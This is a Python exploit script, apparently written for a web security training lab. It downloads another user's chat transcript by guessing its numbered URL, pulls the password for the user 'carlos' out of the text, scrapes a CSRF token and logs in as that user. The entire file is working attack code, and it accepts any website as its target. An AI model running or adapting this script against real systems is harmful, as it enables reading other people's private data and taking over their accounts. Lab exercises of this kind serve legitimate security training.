import requests
import sys
import re

def get_csrf_token(url, session):
    response = session.get(url)
    text = response.text
    csrf_reg = (re.search("csrf(.*)", text).group(1))
    token = csrf_reg.split('"')[2]
    return token

def get_password(url, session):

    print("(+) Getting Carlos's password...")
    chat_url = url + "/download-transcript/1.txt"
    response = requests.get(chat_url)
    text = response.text
    password = (re.search("my password is(.*)", text).group(1)).split(".")[0].strip()
    print(f"(+) Carlos password is: {password}")

    login(url, password, session)

def login(url, password, session):
    
    print("(+) Logging in as Carlos...")

    login_url = url + "/login"
    token = get_csrf_token(login_url, session)
    credentials = {"csrf": token, "username": "carlos", "password": password}

    response = session.post(login_url, data=credentials)
    res = response.text
    if "Log out" in res:
        print("(+) Logged in successfully")
    else:
        print("(-) Could not login")
        print("(-) Exiting...")
        sys.exit(1)


def main():

    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        sys.exit(1)
    
    print("(+) Starting the script...")
    url = sys.argv[1]
    session = requests.Session()
    get_password(url, session)


if __name__ == "__main__":
    main()